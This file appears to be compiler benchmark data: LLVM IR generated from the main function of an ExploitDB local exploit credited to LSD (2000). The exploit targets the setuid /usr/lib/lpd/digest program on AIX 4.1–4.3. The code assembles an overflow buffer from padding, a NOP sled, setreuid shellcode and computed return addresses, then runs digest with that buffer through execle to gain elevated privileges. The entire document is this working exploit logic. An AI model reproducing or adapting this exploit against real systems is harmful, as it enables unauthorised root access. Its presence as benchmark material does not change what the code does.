; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_20453.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/aix/local/extr_20453.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM dec 2000 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [56 x i8] c"/usr/lib/lpd/digest for aix 4.1 4.2 4.3 PowerPC/POWER\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"usage: %s 41|42|43\0A\00", align 1
@setreuidcode = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [3 x i8] c"h\03\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"q\02\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\82\04\00", align 1
@ALLIGN = common dso_local global i32 0, align 4
@PCHNUM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [6 x i8] c"xxx= \00", align 1
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@ADRNUM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [20 x i8] c"/usr/lib/lpd/digest\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca [20000 x i8], align 16
  %9 = alloca [4 x i8], align 1
  %10 = alloca [4 x i8], align 1
  %11 = alloca i8*, align 8
  %12 = alloca [2 x i8*], align 16
  %13 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.1, i64 0, i64 0))
  %16 = load i32, i32* %5, align 4
  %17 = icmp slt i32 %16, 2
  br i1 %17, label %18, label %24

18:                                               ; preds = %3
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = call i32 @exit(i32 -1) #3
  unreachable

24:                                               ; preds = %3
  %25 = load i8**, i8*** %6, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @atoi(i8* %27)
  switch i32 %28, label %41 [
    i32 41, label %29
    i32 42, label %33
    i32 43, label %37
  ]

29:                                               ; preds = %24
  %30 = load i8*, i8** @setreuidcode, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 40
  %32 = call i32 @memcpy(i8* %31, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 2)
  br label %43

33:                                               ; preds = %24
  %34 = load i8*, i8** @setreuidcode, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 40
  %36 = call i32 @memcpy(i8* %35, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 2)
  br label %43

37:                                               ; preds = %24
  %38 = load i8*, i8** @setreuidcode, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 40
  %40 = call i32 @memcpy(i8* %39, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  br label %43

41:                                               ; preds = %24
  %42 = call i32 @exit(i32 -1) #3
  unreachable

43:                                               ; preds = %37, %33, %29
  store i32 0, i32* %13, align 4
  br label %44

44:                                               ; preds = %49, %43
  %45 = load i8**, i8*** %7, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i32 1
  store i8** %46, i8*** %7, align 8
  %47 = load i8*, i8** %45, align 8
  %48 = icmp ne i8* %47, null
  br i1 %48, label %49, label %56

49:                                               ; preds = %44
  %50 = load i8**, i8*** %7, align 8
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strlen(i8* %51)
  %53 = add nsw i32 %52, 1
  %54 = load i32, i32* %13, align 4
  %55 = add nsw i32 %54, %53
  store i32 %55, i32* %13, align 4
  br label %44

56:                                               ; preds = %44
  %57 = load i8**, i8*** %7, align 8
  %58 = ptrtoint i8** %57 to i64
  %59 = load i32, i32* %13, align 4
  %60 = and i32 %59, -4
  %61 = sext i32 %60 to i64
  %62 = add i64 %58, %61
  %63 = sub i64 %62, 8000
  %64 = sub i64 %63, 2300
  %65 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 0
  %66 = bitcast i8* %65 to i64*
  store i64 %64, i64* %66, align 1
  %67 = load i8**, i8*** %7, align 8
  %68 = ptrtoint i8** %67 to i64
  %69 = load i32, i32* %13, align 4
  %70 = and i32 %69, -4
  %71 = sext i32 %70 to i64
  %72 = add i64 %68, %71
  %73 = sub i64 %72, 2300
  %74 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 0
  %75 = bitcast i8* %74 to i64*
  store i64 %73, i64* %75, align 1
  %76 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 3000
  %77 = getelementptr inbounds [2 x i8*], [2 x i8*]* %12, i64 0, i64 0
  store i8* %76, i8** %77, align 16
  %78 = getelementptr inbounds [2 x i8*], [2 x i8*]* %12, i64 0, i64 1
  store i8* null, i8** %78, align 8
  %79 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  store i8* %79, i8** %11, align 8
  store i32 0, i32* %13, align 4
  br label %80

80:                                               ; preds = %87, %56
  %81 = load i32, i32* %13, align 4
  %82 = load i32, i32* @ALLIGN, align 4
  %83 = icmp slt i32 %81, %82
  br i1 %83, label %84, label %90

84:                                               ; preds = %80
  %85 = load i8*, i8** %11, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %11, align 8
  store i8 32, i8* %85, align 1
  br label %87

87:                                               ; preds = %84
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, 1
  store i32 %89, i32* %13, align 4
  br label %80

90:                                               ; preds = %80
  store i32 0, i32* %13, align 4
  br label %91

91:                                               ; preds = %103, %90
  %92 = load i32, i32* %13, align 4
  %93 = load i32, i32* @PCHNUM, align 4
  %94 = icmp slt i32 %92, %93
  br i1 %94, label %95, label %106

95:                                               ; preds = %91
  %96 = load i32, i32* %13, align 4
  %97 = srem i32 %96, 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [4 x i8], [4 x i8]* %10, i64 0, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = load i8*, i8** %11, align 8
  %102 = getelementptr inbounds i8, i8* %101, i32 1
  store i8* %102, i8** %11, align 8
  store i8 %100, i8* %101, align 1
  br label %103

103:                                              ; preds = %95
  %104 = load i32, i32* %13, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %13, align 4
  br label %91

106:                                              ; preds = %91
  %107 = load i8*, i8** %11, align 8
  store i8 0, i8* %107, align 1
  %108 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 3000
  store i8* %108, i8** %11, align 8
  %109 = load i8*, i8** %11, align 8
  %110 = call i32 @sprintf(i8* %109, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %111 = load i8*, i8** %11, align 8
  %112 = getelementptr inbounds i8, i8* %111, i64 5
  store i8* %112, i8** %11, align 8
  store i32 0, i32* %13, align 4
  br label %113

113:                                              ; preds = %127, %106
  %114 = load i32, i32* %13, align 4
  %115 = load i32, i32* @NOPNUM, align 4
  %116 = icmp slt i32 %114, %115
  br i1 %116, label %117, label %130

117:                                              ; preds = %113
  %118 = load i32*, i32** @nop, align 8
  %119 = load i32, i32* %13, align 4
  %120 = srem i32 %119, 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i32, i32* %118, i64 %121
  %123 = load i32, i32* %122, align 4
  %124 = trunc i32 %123 to i8
  %125 = load i8*, i8** %11, align 8
  %126 = getelementptr inbounds i8, i8* %125, i32 1
  store i8* %126, i8** %11, align 8
  store i8 %124, i8* %125, align 1
  br label %127

127:                                              ; preds = %117
  %128 = load i32, i32* %13, align 4
  %129 = add nsw i32 %128, 1
  store i32 %129, i32* %13, align 4
  br label %113

130:                                              ; preds = %113
  store i32 0, i32* %13, align 4
  br label %131

131:                                              ; preds = %144, %130
  %132 = load i32, i32* %13, align 4
  %133 = load i8*, i8** @setreuidcode, align 8
  %134 = call i32 @strlen(i8* %133)
  %135 = icmp slt i32 %132, %134
  br i1 %135, label %136, label %147

136:                                              ; preds = %131
  %137 = load i8*, i8** @setreuidcode, align 8
  %138 = load i32, i32* %13, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds i8, i8* %137, i64 %139
  %141 = load i8, i8* %140, align 1
  %142 = load i8*, i8** %11, align 8
  %143 = getelementptr inbounds i8, i8* %142, i32 1
  store i8* %143, i8** %11, align 8
  store i8 %141, i8* %142, align 1
  br label %144

144:                                              ; preds = %136
  %145 = load i32, i32* %13, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* %13, align 4
  br label %131

147:                                              ; preds = %131
  store i32 0, i32* %13, align 4
  br label %148

148:                                              ; preds = %160, %147
  %149 = load i32, i32* %13, align 4
  %150 = load i32, i32* @ADRNUM, align 4
  %151 = icmp slt i32 %149, %150
  br i1 %151, label %152, label %163

152:                                              ; preds = %148
  %153 = load i32, i32* %13, align 4
  %154 = srem i32 %153, 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 %155
  %157 = load i8, i8* %156, align 1
  %158 = load i8*, i8** %11, align 8
  %159 = getelementptr inbounds i8, i8* %158, i32 1
  store i8* %159, i8** %11, align 8
  store i8 %157, i8* %158, align 1
  br label %160

160:                                              ; preds = %152
  %161 = load i32, i32* %13, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %13, align 4
  br label %148

163:                                              ; preds = %148
  %164 = load i8*, i8** %11, align 8
  store i8 0, i8* %164, align 1
  %165 = getelementptr inbounds [20000 x i8], [20000 x i8]* %8, i64 0, i64 0
  %166 = getelementptr inbounds [2 x i8*], [2 x i8*]* %12, i64 0, i64 0
  %167 = call i32 @execle(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0), i8* %165, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0), i32 0, i8** %166)
  %168 = load i32, i32* %4, align 4
  ret i32 %168
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
